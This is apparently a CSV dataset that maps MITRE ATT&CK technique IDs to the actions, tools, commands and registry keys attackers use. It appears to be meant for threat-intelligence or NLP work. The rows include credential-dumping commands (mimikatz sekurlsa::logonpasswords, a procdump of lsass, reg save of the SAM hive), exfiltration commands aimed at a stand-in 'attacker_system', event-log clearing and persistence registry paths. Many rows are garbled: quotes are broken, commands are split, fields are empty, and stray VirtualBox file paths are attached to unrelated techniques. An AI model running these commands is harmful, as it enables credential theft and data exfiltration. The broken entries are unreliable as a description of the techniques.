id,what,where
t1001,use,steganography
t1001,commingle legitimate traffic,c2 traffic
t1001,add junk data,protocol traffic
t1002,use,compression library
t1002,use,rar
t1002,use,zip
t1002,use,7zip
t1002,use,program
t1002,use,utility
t1002,use,zlib
t1003,use,"""reg save hklm\sam sam"""
t1003,use,secretsdump.py
t1003,look,text string/regex pattern
t1003,use,ntdsutil.exe
t1003,use,mimikatz
t1003,use,pwdumpx.exe
t1003,use,""" /proc filesystem""/procdump/mimikatz/dcsync/lsadump/windows credential editor/procdump  ma lsass.exe lsass_dump/sekurlsa::minidump lsassdump.dmp/sekurlsa::logonpasswords"
t1003,look,""" /proc filesystem""/procdump/mimikatz/dcsync/lsadump/windows credential editor/procdump  ma lsass.exe lsass_dump/sekurlsa::minidump lsassdump.dmp/sekurlsa::logonpasswords"
t1003,look,mimipenguin tool
t1003,use,volume shadow copy
t1003,use,gpprefdecrypt.py
t1003,use,creddump7
t1003,use,invoke ninjacopy
t1003,use,reg utility/reg.exe
t1003,use,gsecdump
t1003,use,get gpppassword
t1003,use,"metasploit?s post exploitation module: ""post/windows/gather/credentials/gpp"""
t1005,use,cmd technique
t1005,use,automated collection technique
t1005,use,command line interface technique
t1006,analyze,file system data structure
t1006,use,ninjacopy
t1007,use,"svc"""
t1007,use,"""tasklist"
t1007,use,net utility
t1007,use,sc utility
t1007,use,"""sc"""
t1007,use,tasklist utility
t1007,use,net start
t1008,use,multiple port
t1008,use,multiple c2 server
t1009,use,binary padding technique
t1010,use,applescript script
t1011,use,modem
t1011,use,cellular data connection
t1011,use,radio frequency channel
t1011,use,wifi connection
t1011,use,bluetooth
t1013,write,fully quantified dll pathname to registry key to hklm\system\currentcontrolset\control\print\monitors
t1013,use,api call
t1014,modify,operating system api call
t1015,press,shift key 5
t1015,press,key combination
t1015,press,sticky key
t1015,replace,accessblity program debugger registry key with cmd.exe path
t1015,press,windows+u
t1016,use,arp
t1016,use,route
t1016,use,nbtstat
t1016,use,ipconfig/ifconfig
t1017,use,application deployment software
t1018,view,net utility
t1018,view,net view
t1018,use,""""
t1018,view,ping utility
t1018,use,"hosts file"""
t1018,use,etc
t1020,use,scripting technique
t1020,use,automated processing
t1020,use,exfiltration over alternative protocol technique
t1021,use,vnc
t1021,use,telnet
t1022,use,programming library
t1022,use,zip
t1022,use,rar
t1022,use,rc4
t1022,use,xor
t1022,use,base64
t1022,use,des3
t1022,use,aes256
t1023,use,masquerading
t1024,use,xoring the plaintext with fixed key
t1024,use,custom cryptographic protocol/custom cryptographic algorithm
t1025,use,cmd
t1025,use,interactive command shell
t1026,,random split
t1026,,different protocol
t1027,use,environment alias
t1027,use,command line interface
t1027,use,platform specific semantic
t1027,use,environment variable
t1027,use,javascrip
t1027,use,steganography
t1027,use,compressed script
t1027,use,archived script
t1027,use,environment character
t1027,use,invoke psimage
t1028,use,powershell
t1028,use,winrm
t1028,use,winrm command
t1029,transfer data,time interval
t1029,transfer data,certain time
t1030,use,fixed size chunk
t1030,use,data size limit
t1031,use,custom utility
t1031,use,system utility
t1031,enable,disabled
t1031,use,sc.exe
t1031,use,reg
t1031,enable,not commonly used service
t1032,use,rsa
t1032,use,ssl
t1032,employ,rc4
t1032,employ,des cbc
t1032,employ,aes256
t1032,employ,aes ecb
t1032,use,aes cbc
t1032,use,aes
t1032,employ,rsa
t1032,employ,caracach encryption
t1032,use,des cbc
t1032,use,rc2
t1032,employ,encryption algorithm
t1032,use,des
t1032,employ,plink utility
t1032,employ,tls
t1032,use,camellia cipher
t1032,use,rc6
t1032,use,rc4
t1032,employ,rc2
t1032,use,aes256
t1032,employ,xor
t1032,use,caracach encryption
t1032,employ,aes
t1032,employ,seal encryption
t1032,use,openssl
t1032,employ,des
t1032,use,encryption algorithm
t1032,use,seal encryption
t1032,employ,camellia cipher
t1032,employ,ssl
t1032,employ,aes cbc
t1032,use,aes ecb
t1033,use,w
t1033,use,users
t1033,use,who
t1034,place executable,high level directory
t1034,place executable,preceeding directory
t1034,place program,same program directory
t1035,modify,service
t1035,use,windows service control manager
t1035,create,service
t1036,place executable,trusted location
t1036,rename,legitimate utility
t1036,use,rtlo character
t1036,rename file,close approximatio of legitimate program
t1036,use,rlo character
t1036,use,right to left override character
t1037,use,logon script
t1038,modify,junction
t1038,modify,directory
t1038,place dll,current directory
t1038,modify,.manifest
t1038,replace,dll
t1038,place dll,current directory=remote location
t1038,modify,.local redirection file
t1039,use,host shared directory
t1039,use,cmd
t1039,use,shared network drive
t1039,use,network file server
t1039,use,interactive command shell
t1040,use,sniffpass
t1040,use,techniques for name service resolution poisoning
t1040,hook,network api
t1040,use,"nbt ns poisoning and relay"""
t1040,use,responder
t1040,use,span port
t1040,use,"""llmnr"
t1040,use,impacket
t1041,use,data protocol==c2 protocol
t1042,use,hkey_classes_root.[extension]
t1042,use,"""hkey_classes_root\txtfile\shell\print\command* """
t1042,use,hkey_classes_root.txt
t1042,use,"""hkey_classes_root\txtfile\shell\open\command"""
t1042,use,"""hkey_classes_root[handler]\shell[action]\command"""
t1042,use,assoc utility
t1042,use,"hkey_classes_root\txtfile\shell\printto\command"""
t1042,use,hkey_classes_root[handler]
t1043,use,tcp:443  https
t1043,use,tcp:25  smtp
t1043,use,udp:53  dns
t1043,use,tcp
t1043,use,udp:3389  rdp
t1043,use,udp:135  rpc
t1044,use,file system permissions weakness
t1045,use,own packing technique
t1045,use,virtual machine software protection
t1045,use,packer
t1045,use,upx
t1046,scan,open port
t1046,use,port scans tool
t1046,probe,open port
t1046,use,vulnerability scans tool
t1047,use,wmic command
t1047,use,invoke wmicommand command
t1047,use,smb service
t1047,use,rpcs service
t1047,use,wmi service
t1048,use,ftp command
t1048,use,smtp
t1048,use,cloud storage
t1048,use,"""net use \\attacker_system\ipc$"
t1048,use,https
t1048,use,"y c:\users\* \\attacker_system\share_folder\"""
t1048,use,c
t1048,use,smb command
t1048,use,some other network protocol
t1048,use,s
t1048,use,http
t1048,use,user:username password && xcopy
t1048,use,dns
t1048,use,"""echo put c:\path\to\file.txt | ftp  a attacker_system"""
t1049,use,netstat
t1049,use,losf
t1049,use,net session
t1049,use,net utility
t1049,use,who  a
t1049,use,net use
t1049,use,who  w
t1050,use,operating system name
t1050,use,service execution technique
t1050,modify,registry
t1050,use,benign software name
t1050,use,masquerading technique
t1051,use,php script
t1051,use,web browser
t1052,use,external hard drive
t1052,use,cellular phone
t1052,use,device
t1052,use,physical medium
t1052,use,mp3 player
t1053,use,task scheduling
t1053,use,utility schtasks
t1053,use,utility at
t1054,tamper,setting
t1054,modify,registry key
t1054,tamper,registry key
t1054,modify,configuration file
t1054,modify,setting
t1054,create,firewall rule
t1054,stop,process
t1054,use,wmi
t1054,tamper,configuration file
t1055,use,vdso hijacking
t1055,use,ptrace system call
t1055,hijack,thread execution
t1055,use,proc
t1055,use,
t1055,use,ld_preload environment variable
t1055,write code,process
t1055,manipulate,code stub mapping
t1055,create,remote thread
t1055,use,early bird injection
t1055,use,dyld_insert_libraries environment variables
t1055,use,ld_library_path environment variable
t1055,use,dlfcn application programming interface  api
t1055,use,atombombing
t1055,use,[pid]
t1056,,external remote services technique
t1056,perform,keylogging
t1056,wrap,windows default credential provider
t1056,,valid accounts technique
t1056,perform,uac prompt
t1057,use,ps command
t1057,use,tasklist utility
t1058,use,service controller
t1058,use,reg
t1058,use,sc.exe
t1058,use,powershell
t1059,use,reverse shell
t1059,use,"c whoami"""
t1059,use,"""""cmd.exe"""
t1059,use,remote shell
t1059,use,cmd.exe
t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\runservicesonce
t1060,modify,hkey_local_machine\software\microsoft\windows
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\explorer\shell folders
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runservicesonce
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runonceex
t1060,create,hkey_current_user\software\microsoft\windows\currentversion\explorer\shell folders
t1060,create,hkey_current_user\software\microsoft\windows\currentversion\run
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\run
t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\explorer\user shell folders
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\explorer\user shell folders
t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\runonce
t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\runservices
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runservicesonce
t1060,modify,nt\currentversion\winlogon\shellhkey_current_user\software\microsoft\windows\currentversion\policies\explorer\run
t1060,modify,nt\currentversion\winlogon\userinit
t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\run
t1060,create,hkey_current_user\software\microsoft\windows\currentversion\runonce
t1060,create,hkey_current_user\software\microsoft\windows\currentversion\runservices
t1060,create,hkey_current_user\software\microsoft\windows nt\currentversion\windows
t1060,create,hkey_current_user\software\microsoft\windows\currentversion\explorer\user shell folders
t1060,modify,hklm\software\microsoft\windows\currentversion\runonceex\0001\depend
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runservices
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runservices
t1060,create,hkey_current_user\software\microsoft\windows\currentversion\runservicesonce
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\run
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\explorer\user shell folders
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\policies\explorer\run
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runonceex
t1060,create,hklm\software\microsoft\windows\currentversion\runonceex\0001\depend
t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runonce
t1060,create,nt\currentversion\winlogon\userinit
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\policies\explorer\run
t1060,modify,hkey_current_user\software\microsoft\windows nt\currentversion\windows
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\explorer\shell folders
t1061,use,windows run command
t1061,use,"remote desktop protocol technique""""windows\system32\drivers\vmmouse.sys""""/"
t1061,use,mouse double click events
t1062,,interruption
t1063,use,dir with cmd
t1063,use,netsh
t1063,use,reg query with reg
t1063,use,tasklist
t1064,,metasploit
t1064,,powersploit
t1065,use,not commonly used port
t1065,use,uncommonly used port
t1066,modify,file
t1066,use,software packing technique
t1067,use,bootkit
t1068,exploit,cve
t1069,use,net localgroup
t1069,use,dscacheutil  q group
t1069,use,ldapsearch
t1070,use,powershell command
t1070,use,wevtutil cl application
t1070,use,wevtutil cl security
t1071,use,smtp
t1071,use,https
t1071,use,common
t1071,use,dns
t1072,use,altiris
t1072,use,sccm
t1072,use,hbss
t1072,use,vnc
t1072,use,third party software
t1074,use,cmd
t1074,use,data compressed technique
t1074,use,bash
t1074,use,interactive command shell
t1075,capture hash,credential access technique
t1076,use,rdp
t1076,use,command line argument
t1076,use,rds
t1077,use,service execution
t1077,use,remote execution
t1077,use,scheduled task
t1077,use,windows management instrumentation
t1077,use,ntlm hash
t1077,use,net utility
t1077,use,rpc
t1077,use,smb
t1077,use,net use
t1078,use,credential access techniques
t1078,use,remote service
t1078,use,social engineering
t1079,tunnel custom encryption scheme,multiple encryption
t1079,tunnel custom encryption scheme,protocol encryption scheme
t1079,use,multiple encryption
t1079,tunnel custom encryption scheme,multilayer encryption
t1079,use,multilayer encryption
t1080,use,shortcut modification
t1080,use,hidden file and directories
t1080,use,masquerading
t1081,use,credential dumping
t1082,use,systeminfo utility
t1082,use,dir utility
t1083,use,ls/find/locatecommands
t1084,use,wmi
t1085,use,"rundll32.exe javascript:""..\mshtml,runhtmlapplication """
t1085,use,shell32.dll function control_rundllasuser
t1085,use,shell32.dll function control_rundll
t1085,use,rundll32.exe
t1086,run,"start process cmdlet """"hklm\hardware\acpi\dsdt\box_""""""""/"
t1086,run,invoke command cmdlet
t1086,run,powershell.exe
t1086,run,psattack
t1086,run,empire
t1086,run,powersploit
t1086,run,system.management.automation assembly
t1086,run,windows common language interface  cli
t1087,acquire information,""""
t1087,use,etc
t1087,use,az ad user list
t1087,acquire information,get msolrolemember powershell cmdlet
t1087,acquire information,net utility
t1087,use,net group
t1087,acquire information,etc
t1087,use,net utility
t1087,use,net localgroup
t1087,use,net user
t1087,acquire information,net user
t1087,acquire information,azure cli
t1087,acquire information,"id"""
t1087,use,"""groups"
t1087,use,""""
t1087,acquire information,"""groups"
t1087,acquire information,"groups """
t1087,use,dscacheutil  q group
t1087,use,get globaladdresslist powershell cmdlet
t1087,use,"groups """
t1087,use,"""dscl . list"
t1087,acquire information,get globaladdresslist powershell cmdlet
t1087,acquire information,"""dscl . list"
t1087,acquire information,az ad user list
t1087,acquire information,"passwd"""
t1087,acquire information,"net localgroup""""windows\system32\vboxdisp.dll"""""""
t1088,inject process,trusted process
t1088,inject software,trusted process
t1088,use,rundll32 technique
t1089,kill,security software
t1089,kill,logging process
t1089,delete,registry keys
t1090,use,socks
t1090,use,proxy
t1090,use,htran
t1090,use,socks5
t1091,use,autorun feature
t1091,format,media firmware
t1091,format,executable file
t1091,modify,"media firmware """"windows\system32\vboxhook.dll""""/"
t1091,rename,malware file
t1091,format,media
t1091,manipulate,media
t1091,modify,executable file
t1091,manipulate,executable file
t1091,manipulate,media firmware
t1093,use,process hollowing
t1094,mimick,well known protocol
t1094,develop,custom protocol
t1095,use,session layer protocol
t1095,use,internet control message protocol  icmp
t1095,use,standard non application layer protocol
t1096,use,ea
t1096,use,file attribute
t1097,use,credential dumping
t1099,use,masquerading  technique
t1101,modify,hklm\system\currentcontrolset\control\lsa\security packages
t1101,modify,hklm\system\currentcontrolset\control\lsa\osconfig\security packages
t1102,post,dead drop resolver
t1103,modify,hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows
t1103,load,user32.dll
t1103,load,hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows
t1103,modify,user32.dll
t1103,modify,hkey_local_machine\software\microsoft\windows nt\currentversion\windows
t1103,load,hkey_local_machine\software\microsoft\windows nt\currentversion\windows
t1104,create,multi stage channel
t1104,use,remote access tool
t1105,use,remote desktop protocol
t1105,use,windows admin share
t1105,use,smb
t1105,use,sftp
t1105,use,scp
t1105,use,rsync
t1105,use,ftp
t1106,use,shellexecuteexw   api
t1106,use,createprocessa   api
t1106,use,loadpackagedlibrary   api
t1106,use,shellexecutea   api
t1106,use,loadmodule   api
t1106,use,winexec   api
t1106,use,loadlibraryw   api
t1106,use,shellexecuteexa   api
t1106,use,createprocessinternala   api
t1106,use,createprocessw   api
t1106,use,loadlibraryexw   api
t1106,use,createprocessasusera   api
t1106,use,loadlibraryexa   api
t1106,use,createprocessasuserw   api
t1106,use,loadlibrarya   api
t1106,use,shellexecutew   api
t1106,use,createprocesswithlogonw   api
t1107,use,del
t1107,use,native cmd
t1107,use,secure deletion tools
t1107,use,third party file deletion tool
t1108,vary,command and control protocol
t1108,use,cloud based infrastructure
t1108,use,web shell technique
t1108,use,cloud based application
t1109,compromise,device firmware
t1110,guess,password
t1110,use,password spraying technique
t1110,use,credential dumping technique
t1110,use,commonly used port
t1111,use,keylogger
t1111,use,inserted hardware token
t1112,prepend keyname,null character
t1112,use,built in windows command line utility reg
t1112,use,remote access tool
t1113,use,native command screencapture
t1113,use,xwd
t1113,use,remote access tool
t1114,access,cache files/ .pst / .ost
t1114,search,cache files/ .pst / .ost
t1114,access,outlook storage/webmail application/outlook web access
t1114,search,email forwarding rule
t1114,search,outlook storage/webmail application/outlook web access
t1114,create,email forwarding rule
t1114,create,outlook storage/webmail application/outlook web access
t1114,access,webmail application/outlook web access
t1114,search,webmail application/outlook web access
t1115,use,windows api
t1115,use,pbpaste
t1116,steal,certificate
t1117,using,component object model hijacking
t1117,using,regsvr32.exe
t1117,send,url
t1117,pass,url
t1117,send,uniform resource locator
t1117,use,regsvr32.exe
t1118,use,[system.componentmodel.runinstaller true ]
t1118,use,attributes within the binary
t1119,use,remote file copy
t1119,use,scripting
t1119,use,file and directory discovery
t1121,use,[comunregisterfunction] attribute
t1121,use,[comregisterfunction] attribute
t1122,change,registry key
t1122,replace,registry key
t1123,use/levarage,voice and video call services
t1123,use/levarage,peripheral devices/applications
t1123,use/levarage,conversations/malware/scripts / microphones/webcams
t1124,use,
t1124,use,net time \hostname
t1124,use,'w32tm
t1125,use,webcam
t1125,use,malware
t1125,use,video call service
t1125,use,peripheral device
t1125,use,application
t1125,write audio file,disk
t1125,use,script
t1125,use,integrated camera
t1126,use,delete command
t1126,use,net use \system\share
t1126,use,net utility
t1128,use,windows registry at hklm\software\microsoft\netsh
t1128,use,vpn software
t1128,modify,netsh registry key
t1128,use,netsh helper dll
t1129,use,"dll pathname specification in import directory/dll pathname exported to another dll/dll directory pathname in ntfs junction / symlink program.exe.local /application manifest/<file name=""filename.extension"" loadfrom=""fully qualified or relative pathnam"
t1129,use,windows native api /createprocess  /loadlibrary  /loadlibraryexw  /dwritecreatefactory
t1130,use,security add trusted cert  d  r trustroot  k
t1130,use,malicious certificate as trusted root certificate
t1130,reinstall,certificate
t1130,use,to
t1130,use,malicious
t1130,use,
t1130,use,bin
t1130,use,keychains
t1130,use,usr
t1130,use,cert
t1130,clone,certificate
t1131,place binary reference,registry key
t1131,place binary reference,"hklm\system\currentcontrolset\control\lsa\""authentication packages"""
t1132,use,character encoding system
t1132,use,binary to text
t1132,use,utf 8
t1132,use,ascii
t1132,use,unicode
t1132,use,standard data encoding system
t1132,use,base64
t1132,use,gzip
t1133,use,valid account technique
t1133,obtain,user credential
t1133,use,credential pharming
t1134,use,createprocesswithtokenw
t1134,use,runas command
t1134,use,windows api function
t1134,use,impersonateloggedonuser
